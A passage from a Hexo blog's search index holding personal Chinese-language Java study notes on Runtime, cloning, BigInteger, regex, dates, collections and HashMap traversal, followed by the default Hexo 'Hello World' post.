class="line">当前系统的运行环境对象</span><br><span class="line">public void exit(int status)0</span><br><span class="line">停止虚拟机</span><br><span class="line">public int availableProcessors()</span><br><span class="line">获得cPU的线程数Runtime.getRuntime().availableProcessors() 20线程</span><br><span class="line">public long maxMemory()</span><br><span class="line">JVM能从系统中获取总内存大小（单位byte)  Runtime.getRuntime().maxMemory()/1024/1024 = 4064 也就是最大内存为4G</span><br><span class="line">public long totalMemory()</span><br><span class="line">JVM已经从系统中获取总内存大小（单位byte)  Runtime.getRuntime().totalMemory()/1024/1024</span><br><span class="line">public long freeMemory()</span><br><span class="line">JVM剩余内存大小（单位byte)</span><br><span class="line">public Process exec(string command)</span><br><span class="line">运行cmd命令</span><br></pre></td></tr></table></figure><h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><ol><li><p>toString()</p></li><li><p>equals(Object obj)每个类型都有相应的方法,比较的规则不同</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果没有重写equals方法,默认使用object中的方法比较地址值</span><br><span class="line">重写之后比较对象内部属性值</span><br><span class="line">    Ctrl+insert</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>clone(int a)</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">克隆只能被本类和子类使用,使用时必须重写</span><br><span class="line">@Override</span><br><span class="line">protected object clone()&#123;</span><br><span class="line">//调用父类中的c1one方法</span><br><span class="line">//相当于让Java帮我们克隆一个对象，并把克隆之后的对象返回出去。</span><br><span class="line">return super.clone();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public class User implement Cloneable//可被克隆</span><br><span class="line">clone返回object需要进行强转</span><br><span class="line">int data=10;</span><br><span class="line">User u1 =new User(1,sun,pwd,path,data);</span><br><span class="line">User u2 = (User)u1.clone();</span><br><span class="line"></span><br><span class="line">对象克隆分为浅克隆和深克隆</span><br><span class="line">浅克隆:拷贝地址,不管是什么数据类型都完全拷贝过来,改变其中一个的数据,另外一个也会改变(地址)</span><br><span class="line">    深克隆:基本数据类型拷贝过来,字符串复用,引用数据类型重新创建新的(可以重写克隆方法实现深克隆,或者是用第三方包方法进行深克隆)</span><br><span class="line">object中的克隆是浅克隆</span><br><span class="line"></span><br><span class="line">boolean result = Objects.equals(s1,s2);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="BigInteger-BigDecimal"><a href="#BigInteger-BigDecimal" class="headerlink" title="BigInteger BigDecimal"></a>BigInteger BigDecimal</h3><p>==对象一但创建就不能发生改变==</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BigInteger原则上可以表示无穷大的整数</span><br><span class="line">BigInteger(int num,Random rnd);取随机大的整数[0~2^num-1]</span><br><span class="line">BigInteger(String val);字符串中必须为整数</span><br><span class="line">BigInteger(String val,int radix);获取指定进制的大整数(比如[22,2]==&gt;其中22是二进制数)</span><br><span class="line"></span><br><span class="line">BigInteger b = BigInteger.valueOf(100);</span><br><span class="line">valueOf(long)</span><br><span class="line"></span><br><span class="line">BigInteger提前把内部常用数字-16~16创建好,如果多次获取不会重写创建新的</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://xiaodi8.com&quot;</span>);</span><br><span class="line"><span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> url.openConnection();</span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(urlConnection.getInputStream()));</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    System.out.println(line);</span><br><span class="line">&#125;</span><br><span class="line">br.close();</span><br></pre></td></tr></table></figure><h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;((?i)Java)(?=8|11|17)&quot;</span>;</span><br><span class="line"><span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(regex);</span><br><span class="line"><span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(<span class="string">&quot;Java8,java,jaVa4&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (matcher.find()) &#123;</span><br><span class="line">    System.out.println(matcher.group());<span class="comment">//==&gt;Java,jaVa</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//?:获取所有  ?=获取前面部分 ?!正则 获取不是指定内容的前面部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//[[0-9]10|11|12]==&gt;0~12</span></span><br><span class="line"><span class="comment">//+,*为贪婪爬取,可能多的匹配</span></span><br><span class="line"><span class="comment">//+?,*?为非贪婪爬取,尽可能少的爬取</span></span><br><span class="line"><span class="comment">//Java中默认贪婪爬取</span></span><br><span class="line">/^(?:(?:\+|<span class="number">00</span>)<span class="number">86</span>)?<span class="number">1</span>(?:(?:<span class="number">3</span>[\d])|(?:<span class="number">4</span>[<span class="number">5</span>-<span class="number">79</span>])|(?:<span class="number">5</span>[<span class="number">0</span>-<span class="number">35</span>-<span class="number">9</span>])|(?:<span class="number">6</span>[<span class="number">5</span>-<span class="number">7</span>])|(?:<span class="number">7</span>[<span class="number">0</span>-<span class="number">8</span>])|(?:<span class="number">8</span>[\d])|(?:<span class="number">9</span>[<span class="number">189</span>]))\d&#123;<span class="number">8</span>&#125;$/</span><br><span class="line">  (.+).\\<span class="number">1</span> ==&gt; 其中\\<span class="number">1</span>表示第一组,以第一个(为第一组,((.)\\<span class="number">2</span>*)这里的二指的是(.)</span><br><span class="line">                               </span><br><span class="line">                              </span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> str.replaceAll(<span class="string">&quot;(.)\\1+&quot;</span>,<span class="string">&quot;$1&quot;</span>);<span class="comment">//去重</span></span><br><span class="line"><span class="comment">//(.)表示把第一个重复的字符看成一组</span></span><br><span class="line"><span class="comment">//\\1 表示第一组再次出现</span></span><br><span class="line"><span class="comment">//+ 表示至少一次</span></span><br><span class="line"><span class="comment">//$1 表示把正则表达式中的第一组拿来用</span></span><br><span class="line"><span class="comment">//正则内用\\1正则外用$1  </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="日期"><a href="#日期" class="headerlink" title="日期"></a>日期</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.解析成一个date对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;2021-01-01&quot;</span>;</span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line"><span class="type">Date</span> <span class="variable">date1</span> <span class="operator">=</span> sdf1.parse(str1);</span><br><span class="line"><span class="comment">//2.格式化</span></span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年MM月dd日&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> sdf2.format(date1);</span><br><span class="line">System.out.println(str2)</span><br></pre></td></tr></table></figure><h3 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h3><p>使用lambda的对象必须是函数接口类型(即一个接口只有一个方法)</p><h3 id="Collections-集合API"><a href="#Collections-集合API" class="headerlink" title="Collections  ( 集合API )"></a>Collections  ( 集合API )</h3><ol><li>boolean addAll(Collection<T>c,T…elements)</li><li>void shuffle (List&lt;?&gt; list)  打乱顺序</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt;list =<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Collections.addAll(list,<span class="string">&quot;adc&quot;</span>,<span class="string">&quot;adf&quot;</span>,<span class="string">&quot;afd&quot;</span>,<span class="string">&quot;dfasdf&quot;</span>,<span class="string">&quot;326&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        Collections.shuffle(list);</span><br><span class="line">        System.out.println(list);</span><br></pre></td></tr></table></figure><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="集合-Collection"><a href="#集合-Collection" class="headerlink" title="集合(Collection)"></a>集合(Collection)</h3><p><img src="C:/Users/96004/AppData/Roaming/Typora/typora-user-images/image-20240514190113288.png" alt="image-20240514190113288"></p><h4 id="list系列集合："><a href="#list系列集合：" class="headerlink" title="list系列集合："></a>list系列集合：</h4><p>添加的元素是有序(录入)、可重复、有索引</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br></pre></td></tr></table></figure><h4 id="set系列集合"><a href="#set系列集合" class="headerlink" title="set系列集合:"></a>set系列集合:</h4><p>  添加的元素是无序，不重复，无索引的</p><p>.add()<br>.contains(“STRING”)<br>.size()</p><p>列表迭代器遍历</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ListIterator&lt;String&gt; iterator = list.listIterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            <span class="keyword">if</span>(s.equals(<span class="string">&quot;b&quot;</span>))&#123;</span><br><span class="line">                iterator.remove();<span class="comment">//iterator.add(&quot;qqq&quot;);</span></span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>集合遍历</p><ol><li><p>Iterator<E>iterator</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Iterator&lt;String&gt; iterator = collection.iterator();</span><br><span class="line">        <span class="keyword">while</span> (iterator.hasNext())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> iterator.next();</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>增强for</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (String s : collection) &#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//s是临时变量,如果修改了增强for中的变量是不会改变集合中原本的数据</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p>Lambda遍历</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">collection.forEach(s-&gt;System.out.println(s));</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;String&gt;set1=<span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">Set&lt;String&gt; set = list.stream().collect(Collectors.toSet());</span><br></pre></td></tr></table></figure><p>==三种通用的遍历方式：<br>迭代器：在遍历的过程中需要删除元素，请使用迭代器。<br>增强for、Lambda:   仅仅想遍历，那么使用增强for或Lambda表达式==</p><p><img src="C:/Users/96004/AppData/Roaming/Typora/typora-user-images/image-20240514200830393.png" alt="image-20240514200830393"></p><h4 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h4><p><img src="C:/Users/96004/AppData/Roaming/Typora/typora-user-images/image-20240523123556294.png" alt="image-20240523123556294"></p><p>==Map是双列集合的顶层接口,他的功能是全部双列集合继承使用的==</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Map集合对象</span></span><br><span class="line">      Map&lt;String,String&gt; m = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">      <span class="comment">//添加元素</span></span><br><span class="line">      <span class="comment">//put 添加和覆盖</span></span><br><span class="line">      <span class="comment">//如果键不存在则添加,返回null</span></span><br><span class="line">      <span class="comment">// 如果键存在则覆盖,并把原有的数据返回</span></span><br><span class="line">      m.put(<span class="string">&quot;Leo&quot;</span>,<span class="string">&quot;Ann&quot;</span>);</span><br><span class="line">      m.put(<span class="string">&quot;Luck&quot;</span>,<span class="string">&quot;Lucy&quot;</span>);</span><br><span class="line">      <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> m.put(<span class="string">&quot;Anna&quot;</span>,<span class="string">&quot;Lucy&quot;</span>);</span><br><span class="line">      System.out.println(s);<span class="comment">//原数据中没有anna，所以返回null</span></span><br><span class="line"></span><br><span class="line">      <span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> m.put(<span class="string">&quot;Luck&quot;</span>,<span class="string">&quot;Fuck&quot;</span>);</span><br><span class="line">      System.out.println(s1);</span><br><span class="line"></span><br><span class="line">      <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> m.remove(<span class="string">&quot;Leo&quot;</span>);</span><br><span class="line">      System.out.println(result);</span><br><span class="line">      <span class="comment">//删除返回被删除的值</span></span><br><span class="line">      <span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> m.remove(<span class="string">&quot;Luck&quot;</span>);</span><br><span class="line">      System.out.println(s2);</span><br><span class="line">      <span class="comment">//判断键是否存在</span></span><br><span class="line">      <span class="type">boolean</span> <span class="variable">valueResult</span> <span class="operator">=</span> m.containsValue(<span class="string">&quot;Lucy&quot;</span>);</span><br><span class="line">      System.out.println(valueResult);</span><br><span class="line">      <span class="type">boolean</span> <span class="variable">isResult</span> <span class="operator">=</span> m.isEmpty();</span><br><span class="line">      <span class="keyword">if</span>(isResult)&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;集合为空&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;集合不为空&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(m);</span><br><span class="line"></span><br><span class="line">      Map&lt;String,String&gt;map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">      map.put(<span class="string">&quot;Leo&quot;</span>,<span class="string">&quot;Ann&quot;</span>);</span><br><span class="line">      map.put(<span class="string">&quot;Luck&quot;</span>,<span class="string">&quot;Lucy&quot;</span>);</span><br><span class="line">      map.put(<span class="string">&quot;Anna&quot;</span>,<span class="string">&quot;Lucy&quot;</span>);</span><br><span class="line"></span><br><span class="line">      Set&lt;String&gt; keys = map.keySet();</span><br><span class="line"></span><br><span class="line">      <span class="comment">//增强for循环遍历</span></span><br><span class="line">      <span class="keyword">for</span> (String key : keys) &#123;</span><br><span class="line">          System.out.println(key);</span><br><span class="line">          <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">          System.out.println(key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//lambda表达式遍历</span></span><br><span class="line">      map.keySet().forEach(key-&gt;&#123;</span><br><span class="line">          System.out.println(key);</span><br><span class="line">          <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">          System.out.println(key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//迭代器遍历</span></span><br><span class="line">      Iterator&lt;String&gt; it = map.keySet().iterator();</span><br><span class="line">      <span class="keyword">while</span>(it.hasNext())&#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> it.next();</span><br><span class="line">          System.out.println(key);</span><br><span class="line">          <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">          System.out.println(key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//增强for循环遍历</span></span><br><span class="line">      Set&lt;Map.Entry&lt;String,String&gt;&gt; entrySet = map.entrySet();</span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String,String&gt; entry : entrySet) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">          <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">          System.out.println(key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(Map.Entry&lt;String,String&gt; entry : map.entrySet())&#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">          <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">          System.out.println(key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//lambda表达式遍历</span></span><br><span class="line">      map.forEach(<span class="keyword">new</span> <span class="title class_">BiConsumer</span>&lt;String, String&gt;() &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">accept</span><span class="params">(String key, String value)</span> &#123;</span><br><span class="line">              System.out.println(key + <span class="string">&quot;=&quot;</span> + value);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">      map.forEach((String key,String value)-&gt;&#123;</span><br><span class="line">          System.out.println(key+<span class="string">&quot;=&quot;</span>+value);</span><br><span class="line">      &#125;);</span><br></pre></td></tr></table></figure><h4 id="LinkedHashMap"><a href="#LinkedHashMap" class="headerlink" title="LinkedHashMap"></a>LinkedHashMap</h4><p><img src="C:/Users/96004/AppData/Roaming/Typora/typora-user-images/image-20240523124332017.png" alt="image-20240523124332017"></p><h3 id="二叉树-BinaryTree"><a href="#二叉树-BinaryTree" class="headerlink" title="二叉树(BinaryTree)"></a>二叉树(BinaryTree)</h3><h4 id="平衡二叉树"><a href="#平衡二叉树" class="headerlink" title="平衡二叉树"></a>平衡二叉树</h4><h4 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h4><p><img src="C:/Users/96004/AppData/Roaming/Typora/typora-user-images/image-20240515154357633.png" alt="image-20240515154357633"></p><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><p>Alt + enter 一键补全</p><p>Alt + insert 一键初始化改写</p><p>Ctrl + n 查找类名源代码</p><p>Ctrl + b 查看源代码</p><p>Ctrl + Alt + m 代码提取，封装成方法</p><p>Ctrl + Alt + ← 回到上一个源码类</p><p>Ctrl + F12 查找用法</p><p>Ctrl + Alt + l 规范代码</p><p>Alt + 7 查看代码结构</p><p>Ctrl AIT v <code>Runtime.getRuntime();===&gt;Runtime runtime = Runtime.getRuntime();</code></p><h2 id="添加依赖-导包"><a href="#添加依赖-导包" class="headerlink" title="添加依赖(导包)"></a>添加依赖(导包)</h2><p>在根目录新建lib文件夹,导入代码,并右键点击add as library</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/03/25/Hello-world/"/>
      <url>/2024/03/25/Hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
